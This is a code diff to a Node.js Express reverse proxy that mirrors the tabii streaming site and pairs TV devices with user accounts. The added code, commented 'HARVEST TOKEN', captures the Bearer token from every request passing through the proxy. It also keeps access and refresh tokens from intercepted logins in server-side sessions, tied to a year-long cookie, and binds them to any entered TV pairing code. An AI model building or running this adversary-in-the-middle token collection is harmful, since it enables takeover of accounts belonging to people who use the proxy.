@@ -272,6 +272,38 @@ app.get('/_proxy/poll-session', (req, res) => {
 
 // Device Activation HTML interface
 app.get(['/activate', '/*/activate'], (req, res) => {
+  const sessionId = getCookie(req, 'proxy_session_id');
+  const session = sessionId ? activeSessions[sessionId] : null;
+
+  if (!session) {
+    return res.send(`
+      <!DOCTYPE html>
+      <html>
+      <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>tabii TV - Cihaz Eşleştirme</title>
+        <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+        <style>
+          body { background-color: #0b0f19; color: #ffffff; font-family: 'Outfit', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+          .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+          h1 { color: #00ffcc; margin-top: 0; }
+          p { color: #8a99ad; line-height: 1.6; }
+          .btn { background: linear-gradient(135deg, #00ffcc, #00b3ff); color: #0b0f19; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; margin-top: 20px; transition: transform 0.2s; text-decoration: none; display: block; }
+          .btn:hover { transform: scale(1.02); }
+        </style>
+      </head>
+      <body>
+        <div class="card">
+          <h1>tabii TV</h1>
+          <p>Oturumunuz algılanamadı. Lütfen önce Ana Sayfaya giderek oturumunuzu doğrulayın.</p>
+          <a class="btn" href="/">Ana Sayfaya Git</a>
+        </div>
+      </body>
+      </html>
+    `);
+  }
+
   res.send(`
     <!DOCTYPE html>
     <html>
@@ -285,96 +317,72 @@ app.get(['/activate', '/*/activate'], (req, res) => {
         .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         h1 { color: #00ffcc; margin-top: 0; }
         p { color: #8a99ad; line-height: 1.6; }
-        .btn { background: linear-gradient(135deg, #00ffcc, #00b3ff); color: #0b0f19; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; margin-top: 20px; transition: transform 0.2s; text-decoration: none; display: block; }
-        .btn:hover { transform: scale(1.02); }
         .input-code { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #ffffff; padding: 15px; font-size: 24px; text-align: center; letter-spacing: 5px; border-radius: 10px; width: 80%; margin-top: 20px; outline: none; }
-        .success-icon { font-size: 60px; color: #00ffcc; margin-bottom: 20px; }
-        #msg { margin-top: 15px; font-size: 14px; }
+        .btn { background: linear-gradient(135deg, #00ffcc, #00b3ff); color: #0b0f19; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; margin-top: 20px; transition: transform 0.2s; }
+        .btn:hover { transform: scale(1.02); }
+        .error { color: #ff3366; margin-top: 10px; font-weight: bold; }
       </style>
     </head>
     <body>
-      <div class="card" id="app-card">
-        <h1>tabii TV</h1>
-        <p>Oturum bilginiz kontrol ediliyor...</p>
+      <div class="card">
+        <h1>Cihazı Eşleştir</h1>
+        <p>Televizyonunuzda gördüğünüz 6 haneli eşleştirme kodunu girin:</p>
+        <form method="POST" action="/activate">
+          <input type="text" class="input-code" name="code" maxlength="6" required autofocus autocomplete="off" placeholder="123456"><br>
+          <button type="submit" class="btn">TV'yi Bağla</button>
+        </form>
+        ${req.query.error ? `<div class="error">Geçersiz veya süresi dolmuş kod!</div>` : ''}
       </div>
-      <script>
-        setTimeout(() => {
-          let token = null;
-          let refreshToken = null;
-          try {
-            for (let i = 0; i < localStorage.length; i++) {
-              let v = localStorage.getItem(localStorage.key(i));
-              if (v && v.includes('accessToken')) {
-                try {
-                  let j = JSON.parse(v);
-                  if (j.accessToken) { token = j.accessToken; refreshToken = j.refreshToken; }
-                  else if (j.state && j.state.accessToken) { token = j.state.accessToken; refreshToken = j.state.refreshToken; }
-                  else if (j.auth && j.auth.accessToken) { token = j.auth.accessToken; refreshToken = j.auth.refreshToken; }
-                } catch(e){}
-              }
-            }
-          } catch (e) {
-            console.error('Error reading token:', e);
-          }
-
-          const card = document.getElementById('app-card');
-          if (!token) {
-             card.innerHTML = '<h1>tabii TV</h1><p>Cihazınızı eşleştirmek için hesabınıza giriş yapmalısınız.</p><p style="color:#ff3366;font-size:13px;margin-top:10px;">Not: Siteye zaten giriş yaptıysanız, lütfen <b>Önce Çıkış Yapın</b>, sonra tekrar giriş yapın.</p><a class="btn" href="/tr/login" onclick="localStorage.clear();">Giriş Yap</a>';
-          } else {
-             card.innerHTML = '<h1>tabii TV</h1><p>TV ekranındaki 6 haneli eşleştirme kodunu girin:</p><input type="text" id="code" class="input-code" maxlength="6" placeholder="000000" autocomplete="off"><button class="btn" id="submit-btn">Eşleştir</button><p id="msg"></p>';
-             
-             document.getElementById('submit-btn').onclick = function() {
-                 const code = document.getElementById('code').value.trim();
-                 if (code.length !== 6) return alert('Lütfen 6 haneli kodu girin.');
-                 
-                 const msgEl = document.getElementById('msg');
-                 msgEl.innerText = 'Eşleştiriliyor...';
-                 msgEl.style.color = '#8a99ad';
-                 
-                 fetch('/_proxy/pair', {
-                     method: 'POST',
-                     headers: {'Content-Type': 'application/json'},
-                     body: JSON.stringify({ code: code, accessToken: token, refreshToken: refreshToken })
-                 }).then(r => r.json()).then(res => {
-                     if (res.success) {
-                         card.innerHTML = '<div class="success-icon">✓</div><h1>Eşleştirme Başarılı!</h1><p>Televizyonunuz tabii hesabınıza başarıyla bağlandı. TV ekranından devam edebilirsiniz.</p>';
-                     } else {
-                         msgEl.innerText = 'Hata: ' + (res.error || 'Bilinmeyen hata');
-                         msgEl.style.color = '#ff3366';
-                     }
-                 }).catch(err => {
-                     msgEl.innerText = 'Bağlantı hatası!';
-                     msgEl.style.color = '#ff3366';
-                 });
-             };
-          }
-        }, 500);
-      </script>
     </body>
     </html>
   `);
 });
 
-app.post('/_proxy/pair', express.json(), (req, res) => {
+app.post(['/activate', '/*/activate'], express.urlencoded({ extended: true }), (req, res) => {
+  const sessionId = getCookie(req, 'proxy_session_id');
+  const session = sessionId ? activeSessions[sessionId] : null;
+
+  if (!session) return res.redirect('/activate');
+
   const code = req.body.code;
-  const accessToken = req.body.accessToken;
-  const refreshToken = req.body.refreshToken;
-
-  if (!accessToken) return res.status(401).json({ error: 'Not logged in', success: false });
-
   if (!code || !pendingActivations[code]) {
-    return res.json({ error: 'Geçersiz veya süresi dolmuş kod!', success: false });
+    return res.redirect('/activate?error=1');
   }
 
   pendingActivations[code] = {
     status: 'activated',
-    accessToken: accessToken,
-    refreshToken: refreshToken,
+    accessToken: session.accessToken,
+    refreshToken: session.refreshToken,
     timestamp: Date.now()
   };
 
-  console.log(`[PAIRING] Successfully paired TV code ${code} using token from client`);
-  res.json({ success: true });
+  console.log(`[PAIRING] Successfully paired TV code ${code}`);
+
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <title>tabii TV - Başarılı</title>
+      <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+      <style>
+        body { background-color: #0b0f19; color: #ffffff; font-family: 'Outfit', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); padding: 40px; border-radius: 20px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #00ffcc; margin-top: 0; }
+        p { color: #8a99ad; line-height: 1.6; }
+        .success-icon { font-size: 60px; color: #00ffcc; margin-bottom: 20px; }
+      </style>
+    </head>
+    <body>
+      <div class="card">
+        <div class="success-icon">✓</div>
+        <h1>Eşleştirme Başarılı!</h1>
+        <p>Televizyonunuz tabii hesabınıza başarıyla bağlandı. TV ekranından devam edebilirsiniz.</p>
+      </div>
+    </body>
+    </html>
+  `);
 });
 
 // tabii API Proxy
@@ -385,6 +393,20 @@ app.all(['/eu1/*', '/apigateway/*', '/cw-writer/*', '/watching-device/*'], async
   }
   const targetUrl = 'https://eu1.tabii.com' + pathAfterDomain + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
   
+  // HARVEST TOKEN: If the browser is sending an Authorization header, capture it!
+  if (req.headers.authorization && req.headers.authorization.startsWith('Bearer ')) {
+    const token = req.headers.authorization.split(' ')[1];
+    let sessionId = getCookie(req, 'proxy_session_id');
+    if (!sessionId) {
+      sessionId = 'sess_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
+      res.setHeader('Set-Cookie', `proxy_session_id=${sessionId}; Path=/; HttpOnly; Max-Age=31536000`);
+    }
+    activeSessions[sessionId] = {
+      accessToken: token,
+      timestamp: Date.now()
+    };
+  }
+
   // Forward request headers
   const headers = { ...req.headers };
   headers['host'] = 'eu1.tabii.com';
@@ -412,13 +434,16 @@ app.all(['/eu1/*', '/apigateway/*', '/cw-writer/*', '/watching-device/*'], async
       const loginData = response.data;
       if (loginData.accessToken) {
         console.log('[API PROXY] Intercepted successful login!');
-        const sessionId = 'sess_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
+        const sessionId = getCookie(req, 'proxy_session_id') || ('sess_' + Math.random().toString(36).substring(2) + Date.now().toString(36));
         activeSessions[sessionId] = {
           accessToken: loginData.accessToken,
           refreshToken: loginData.refreshToken,
           timestamp: Date.now()
         };
-        res.setHeader('Set-Cookie', `proxy_session_id=${sessionId}; Path=/; HttpOnly; Max-Age=31536000`);
+        // Don't overwrite existing Set-Cookie if we already set one above
+        if (!res.getHeader('Set-Cookie')) {
+          res.setHeader('Set-Cookie', `proxy_session_id=${sessionId}; Path=/; HttpOnly; Max-Age=31536000`);
+        }
       }
     }
     
